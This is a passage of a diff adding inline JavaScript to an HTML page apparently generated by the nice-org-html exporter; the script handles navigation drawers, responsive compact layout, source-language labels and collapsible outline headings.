+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
